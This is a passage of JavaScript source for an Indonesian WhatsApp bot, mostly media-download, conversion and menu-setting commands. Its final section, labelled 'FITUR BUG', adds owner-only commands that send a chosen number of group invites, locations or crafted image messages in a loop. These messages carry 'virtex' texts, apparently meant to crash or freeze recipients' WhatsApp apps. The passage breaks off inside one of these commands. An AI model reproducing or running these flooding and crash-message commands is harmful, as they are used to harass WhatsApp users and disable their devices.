const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["ꜱɪᴀᴩ ☕","ꜱɪᴀᴩ ☕"]
const bully3 = b3[Math.floor(Math.random() * b3.length)]
//if (atibot === true) return 
                     
   
  

   




   
   
  
try{ 
switch (command) {
	

case 'scmp3':{
if(!q) return setReply("*Masukan link!!*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 🤣*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 😔 => ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if(q.includes("social_sharing")) return setReply("*Masukan link dengan benar*")
nana = q.replace('https://m.', 'https://')
setReply("*Wait Sedang Download...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
menit = Math.round(track.full_duration/1000/60)
if(menit > 8) return setReply("*Tidak bisa mendownload musik lebih dari 8 menit*")
scdlMp3(nana)
}
break
 
case 'scdoc':{
if(!q) return setReply("*Masukan link!!*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 🤣*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 😔 => ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if(q.includes("social_sharing")) return setReply("*Masukan link dengan benar*")
nana = q.replace('https://m.', 'https://')
setReply("*Wait Sedang Download...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
menit = Math.round(track.full_duration/1000/60)
if(menit > 8) return setReply("*Tidak bisa mendownload musik lebih dari 8 menit*")
scdlDoc(nana)
}
break
 
case 'scsearch':
case 'soundcloudsearch':
if(!q) return setReply("*Masukan link!!*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 🤣*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 😔 => ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
scdl = await SoundCloud.create();
result = await scdl.search({
query: q,
limit: 15, 
offset: 0, 
filter: 'tracks' 
});

teks =`*──❒ SOUND CLOUDSEARCH ❒──*`

for (let res of result.collection){
teks +=`

*📂 Judul :* ${res.title}
*⏰ Durasi :* ${Math.round(res.full_duration/1000/60)} Menit
*◀️ Diputar :* ${h2k(res.playback_count)} kali
*❤️ Disukai :* ${h2k(res.likes_count)}
*🌏 Release :* ${res.release_date}
*♻️ Repost :* ${h2k(res.reposts_count)}
*🔈 Format :* ${res.track_format}
*🔎 Url :* ${res.permalink_url}
`
} 

teks +=`_Thanks for choosing SoundCloud_`

try{
anuah = result.collection[0].artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://telegra.ph/file/410bf73594dfd474ce673.jpg"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `🎶 ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `💼 ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
break
  
case 'playmusic':
case 'soundcloud':
case 'playing':
if(!q) return setReply("*Judul lagunya apa kak ?*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 🤣*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 😔 => ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
if(q.startsWith("https://")){
nana = q.replace('https://m.', 'https://')
scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(nana)
console.log(res)
teks =`*──⌞ SOUNDCLOUD DOWNLOADER ⌟──*

*📂 Judul :* ${res.title}
*⏰ Durasi :* ${Math.round(res.full_duration/1000/60)} Menit
*◀️ Diputar :* ${h2k(res.playback_count)} kali
*❤️ Disukai :* ${h2k(res.likes_count)}
*🌏 Release :* ${res.release_date}
*♻️ Repost :* ${h2k(res.reposts_count)}
*🔈 Format :* ${res.track_format}
`
try{
anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://telegra.ph/file/410bf73594dfd474ce673.jpg"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `🎶 ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `💼 ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]

sendButImage(from, teks, copyright, yamiyami, nano, {contextInfo: forward}) 
//sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
} else {

scdl = await SoundCloud.create();
 result = await scdl.search({
  query: q,
  limit: 20, 
  offset: 0, 
  filter: 'tracks' 
});

res = result.collection[0] 

try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
teks =`*──❒ SOUNDCLOUD DOWNLOADER ❒──*

*📂 Judul :* ${res.title}
*👤 Artis :* ${artis}
*💽 Album :* ${album}
*⏰ Durasi :* ${Math.round(res.full_duration/1000/60)} Menit
*◀️ Diputar :* ${h2k(res.playback_count)} kali
*❤️ Disukai :* ${h2k(res.likes_count)}
*🌏 Release :* ${res.release_date}
*♻️ Repost :* ${h2k(res.reposts_count)}
*🔈 Format :* ${res.track_format}
`

try{
anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
anuh ="https://telegra.ph/file/410bf73594dfd474ce673.jpg"
var yamiyami = await getBuffer(anuh)
}
nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `🎶 ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `💼 ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
//sendButLocation(from, teks, `© ${fake1}`, yamiyami, nano, {contextInfo: forward})
sendButImage(from, teks, copyright, yamiyami, nano, {contextInfo: forward}) 
}
break

case 'loc':
if(isExtream) return
if (!isOwner) return onlyOwner()
 //  jpegThumbnail: virgam,
xdev.sendMessage(from, {
degreesLatitude: -21.422,
degreesLongitude: 39.826,
name: "21.422,39.826",
address: "21.422,39.826"
}, location, 
{thumnail: thumb, contextInfo:forward})
break

	
case 'tomp4':
case 'tovideo':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
 }      
sendVideo(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

}
break
	
	
case 'togif':
if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && !q) {
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
ger = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
file = await  xdev.downloadAndSaveMediaMessage(ger)
outGif = `./temp/${getRandom('.gif')}`
outMp4 = `./temp/${getRandom('.mp4')}`
status = false
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, (err) => {
if (err) {
console.log(err)
return setReply(err)
 }      
sendGif(fs.readFileSync(outMp4))
status = true
 if(status){
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
 status = false
 }
    })
}) 

} else if(isQuotedVideo){
setReply(mess.wait)
ger = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM','m')).message.extendedTextMessage.contextInfo : dev 
outMp4 = `${getRandom('.mp4')}`
file = await xdev.downloadMediaMessage(ger);
fs.writeFileSync(`./${outMp4}`, file);
sendGif(fs.readFileSync(outMp4))
fs.unlinkSync(`./${outMp4}`)
}
break

	
	
	
case 'play':
try{
if(!q) return setReply("*Apa Yang Mau Dicari Kak?*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
res = await yts(q)
let info = await ytdl.getInfo(res.all[0].url);
let audio = ytdl.filterFormats(info.formats, 'audioonly');
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
let videoID = res.all[0].url.split("=")[1]
thumbnya =`https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`
teks =`*📂 Judul :* ${res.all[0].title}
*🌏 Ditonton :* ${h2k(res.all[0].views)} Kali
*⏳ Durasi :* ${res.all[0].timestamp}
*🎧 Audio :* ${FileSize(audio[0].contentLength)}`

yamyam = await getBuffer(`${thumbnya}`)
let aklo =[{"buttonId": `${prefix}youtubemp3 ${res.all[0].url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
                    {"buttonId": `tanks`,"buttonText": {"displayText": `ᴛᴀɴᴋꜱ`},"type": "RESPONSE"}]
sendButLocation(from,`*──❒ YOUTUBE DOWNLOAD ❒──*\n\n${teks}`, `© ${fake1}\n${week} , ${calender}`, yamyam, aklo, {contextInfo: forward})
} catch (err){
setReply(err)
}
break
	
	
	/*
	case 'playmp3': case 'ytaudio': {
        if (!q) return setReply(  `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
        setReply("*Downloading...*")
		let { aiovideodl } = require('./lib/scraper')
                let result = await aiovideodl(isUrl(q)[0])
                let { url, title, thumbnail, duration, medias } = result
                let quality = '64kbps'                
                let media = medias.filter(v => v.videoAvailable == false && v.audioAvailable == true && v.quality == quality).map(v => v)
                if (media[0].formattedSize.split('MB')[0] >= 20.00) return setReply('File Melebihi Batas'+util.format(media))
              sendFileFromUrl (media[0].url , audio, {quoted: dev}) 
            }
            break
	
	
	
	
	case 'playmp4': case 'ytvideo': {
        if (!q) return setReply( `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`)
        setReply("*Downloading...*")
		let { aiovideodl } = require('./lib/scraper')
                let result = await aiovideodl(isUrl(q)[0])
                let { url, title, thumbnail, duration, medias } = result
                let quality = '360p'                
                let media = medias.filter(v => v.videoAvailable == true && v.audioAvailable == false && v.quality == quality).map(v => v)
                if (media[0].formattedSize.split('MB')[0] >= 50.00) return setReply('File Melebihi Batas'+util.format(media))
                console.log(media)
                sendFileFromUrl (media[0].url , video, {quoted: dev, caption: "Nih"}) 
            }
            break
	
	*/
	

	

	
	
	
case 'youtubemp3':
try{
if(!isUrl) return setReply("*Link Youtubenya Mana Kak?*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
let info = await ytdl.getInfo(q);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
veryLow = audioFormats[3].contentLength
low = audioFormats[2].contentLength
medium = audioFormats[0].contentLength
if(Number(low) > 15000000 ) return setReply(`Bjir sizenya ${FileSize(low)}\nAu ah ga mao download 😤`)
sendFileFromUrl (audioFormats[2].url, audio, {quoted: dev}) 
} catch(err){
setReply(err)
}
break
	

	
case 'youtubemp4':
try{
if(!isUrl) return setReply("*Link Youtubenya Mana Kak?*")
if (isLimit < 1) return reply(`*Limit Kamu Sudah Habis 😭*\n*Kirim Perintah {prefix}limit Untuk Mengecek Limit*`)
limitAdd(senderNumber, user)
reply(`*Satu limit terpakai 🙂*\n*Sisa Limit Kamu ─➣ ${isPremium ? 'Unlimited' : `${getLimit(senderNumber, limitCount, user)}/${limitCount}`}*`)
let info = await ytdl.getInfo(q);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)
sendMediaURL (from, format.url, "*Done Kak!!*")
} catch(err){
setReply(err)
}
break

	
	

	

                


	
	
case 'allmenu':
if (!checkDataId ("settingmenu", from, DataId)  && isGroup) return setReply("*Fitur Allmenu Blom Aktif Kak*\n*Kirim Perintah .settingmenu Untuk Mengaktifkan Allmenu*")
menunya = hentong.ahah(prefix, pushname, week, weton, calender)
let woker = [{"buttonId": `Oke`,"buttonText": {"displayText": `ᴛᴀɴᴋꜱ`},"type": "RESPONSE"},
             {"buttonId": `${prefix}owner`,"buttonText": {"displayText": `ᴏᴡɴᴇʀ`},"type": "RESPONSE"}]
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(hentong.ahah(prefix, pushname))
} else if(setmenu === "troli") {
sendTroli(hentong.ahah(prefix, pushname))
} else if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya, `© ${fake1}\n${week} , ${calender}`, fs.readFileSync('./stik/thumb.jpeg'), woker, {contextInfo: forward})
} else if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\nBaterai : ${baterai.battery}\n© ${fake1}`)
} else if(setmenu === "dokumen") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), woker, options)
} else if(setmenu === "image") {
costum(`*Loading...*`)
sendButImage(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {thumbnail: thumb, fileLength: 999999999999 })
}
break


		
case 'menu':
case 'help':   
try{
buffer = fs.readFileSync(`./temp/musik/sound_3.mp3`)
xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {ptt: true, contextInfo: forward}}})
stod = `${sender}`
menunya = help.menu(dateIslamic, thisHit ,listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limitCount, getBalance, senderNumber, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing, Antibuggc,antibugtroli,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴꜰᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}allmenu`,"buttonText": {"displayText": `ᴀʟʟᴍᴇɴᴜ`},"type": "RESPONSE"}]
options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:`http://wa.me/${nomerOwner}`}}}  
options1 = { thumbnail: thumb, fileLength: 999999999999, contextInfo: forward}
if(setmenu === "katalog") {
costum(`*Loading...*`)
sendKatalog(menunya)
}  else if(setmenu === "troli") {
sendTroli(menunya)
}else  if(setmenu === "document") {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options)
} else  if(setmenu === "lokasi") {
costum(`*Loading...*`)
sendButLocation(from, menunya,`© ${fake1}\n${week} , ${calender}`, fs.readFileSync('./stik/thumb.jpeg'), mok, {contextInfo: forward})
} else  if(setmenu === "gif") {
costum(`*Loading...*`)
sendGif(fs.readFileSync('./stik/video.mp4'), menunya + `\n\n© ${fake1}`)
} else if(setmenu === "image") {
costum(`*Loading...*`)
sendButImage(from, menunya, `\n© ${fake1}`, fs.readFileSync('./stik/thumb.jpeg'), mok, options)
}
} catch(err) {
sendMess(err)
sendTroli(menunya)
}
break
	
	
	

	
	
case 'setmenu':
if(!isOwner) return
if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
setmenu = "katalog"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'image'|| (args[0]) === 'foto' ){
setmenu = "image"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'lokasi' ){
setmenu = "lokasi"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'troli' ){
setmenu = "troli"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
}else if ((args[0]) === 'pptx'){
docType = "pptx"
setmenu = "document"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'xlsx'){
docType = "xlsx"
setmenu = "document"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'zip'){
docType = "zip"
setmenu = "document"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else if ((args[0]) === 'pdf'){
docType = "pdf"
setmenu = "document"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else  if ((args[0]) === 'gif'){
setmenu = "gif"
await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
}  else if (!q) {
sendButMessage(from, `SETTING MENU\n1.Katalog\n2.Troli\n3.Lokasi\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
{buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
} else {
setReply("Menu tidak di temukan om")
}
break
        



        


case 'setquoted':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
		if(Qoted === "ftoko") return setReply("Udah aktif")
		Qoted = "ftoko"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftoko})
		} else if ((args[0]) === 'fkontak' ){
		if(Qoted === "fkontak") return setReply("Udah aktif")
		Qoted = "fkontak"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fkontak})
		} else if ((args[0]) === 'ftext'){
		if(Qoted === "ftext") return setReply("Udah aktif")
		Qoted = "ftext"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftext})
		} else if ((args[0]) === 'ftroli'){
		if(Qoted === "ftroli") return setReply("Udah aktif")
		Qoted = "ftroli"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: ftroli})
		}else if ((args[0]) === 'fsticker' ){
		if(Qoted === "fsticker") return setReply("Udah aktif")
		Qoted = "fsticker"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fsticker})
		} else if ((args[0]) === 'fvn'){
		if(Qoted === "fvn") return setReply("Udah aktif")
		Qoted = "fvn"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvn})
		} else if ((args[0]) === 'floc'){
		if(Qoted === "floc") return setReply("Udah aktif")
		Qoted = "floc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: floc})
		} else if ((args[0]) === 'fvideo' ){
		if(Qoted === "fvideo") return setReply("Udah aktif")
		Qoted = "fvideo"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fvideo})
		} else if ((args[0]) === 'fgc'){
		if(Qoted === "fgc") return setReply("Udah aktif")
		Qoted = "fgc"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgc})
		} else if ((args[0]) === 'fgif'){
		if(Qoted === "fgif") return setReply("Udah aktif")
		Qoted = "fgif"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fgif})
		}else if ((args[0]) === 'fimage'){
		if(Qoted === "fimage") return setReply("Udah aktif")
		Qoted = "fimage"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: fimage})
		} else if ((args[0]) === 'dev'){
		if(Qoted === "dev") return setReply("Udah aktif")
		Qoted = "dev"
		await xdev.sendMessage(from,`Berhasil mengubah quoted ke ${q}`, text, {quoted: dev})
		} else if (!q) {
        sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
        {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
        {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
        {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}]);
         } else {
teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.fsticker\n6.fvn\n7.floc\n8.fvideo\n9.fgc\n10.fgif\n11.fimage\n12.dev`
setReply(teks)
}
break



case 'setreply':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(setWeb) return setReply("Udah aktif")
setWeb = true
setTroli = false
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(setTroli) return setReply("Udah aktif")
setWeb = false
setTroli = true
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'mess'){
if(setMessage) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = true
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'vidio'|| (args[0]) === 'video' ){
if(setVideo) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = false
setVideo = true
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
sendButMessage(from, `SETTING REPLY`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
} 
break







  
case 'setbc':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'troli'|| (args[0]) === 'product' ){
if(bcTroli) return setReply("Udah aktif")
bcTroli = true
bcLokasi = false
bcDokumen = false   
await xdev.sendMessage(from,"Berhasil mengubah broadcast ke troli", text, {quoted: setQuoted})
} else if ((args[0]) === 'lokasi' ){
if(bcLokasi) return setReply("Udah aktif")
bcTroli = false
bcLokasi = true
bcDokumen = false   
await xdev.sendMessage(from,"Berhasil mengubah broadcast ke lokasi", text, {quoted: setQuoted})
} else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
if(bcDokumen) return setReply("Udah aktif")
bcTroli = false
bcLokasi = false
bcDokumen = true   
await xdev.sendMessage(from,"Berhasil mengubah broadcast ke dokumen", text, {quoted: setQuoted})
} else if (!q) {
sendButMessage(from, `SETTING BROADCAST`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setbc pdf`, buttonText: {displayText: `ᴅᴏᴋᴜᴍᴇɴ`},type: 1},
{buttonId: `${prefix}setbc troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setbc lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
}
break
	
	
	
		
	




 	
	
	
//-------------------------------》FITUR BUG《-------------------------------\\
	
case 'kirin':
if(isExtream) return
if (!isOwner) return onlyOwner()
if (args.length < 1) return reply ('jumlahnya berapa kak')
for (let i = 0; i < args[0]; i++) {
xdev.sendMessage(from, {
'groupName': fake,
'groupJid': '6285156137901-1627579259@g.us',
'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
'inviteExpiration': '0',
'caption': virtex7(prefix),
'jpegThumbnail': davizin,
}, MessageType.groupInviteMessage, { contextInfo: forward
})        
}
break
 
 
 
case 'katsu':
if(isExtream) return
if (!isOwner) return onlyOwner()
if (args.length < 1) return reply ('jumlahnya berapa kak')
for (let i = 0; i < args[0]; i++) {
xdev.sendMessage(from, {
degreesLatitude: 36.036105801662316,
degreesLongitude: 138.09072320256624,
name: virtex7(prefix),
address: virtex6(prefix),
jpegThumbnail: virgam,
}, location,
{contextInfo: forward})
}
break
           
           
case 'kamui':
if(isExtream) return
if (!isOwner) return onlyOwner()
if (args.length < 1) return reply ('jumlahnya berapa kak')
for (let i = 0; i < args[0]; i++) {
var kirin = xdev.prepareMessageFromContent(from, {
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
"mimetype": "image/jpeg",
"caption": fake,
"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
"fileLength": "28777",
"height": 1080,
"width": 1079,
"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
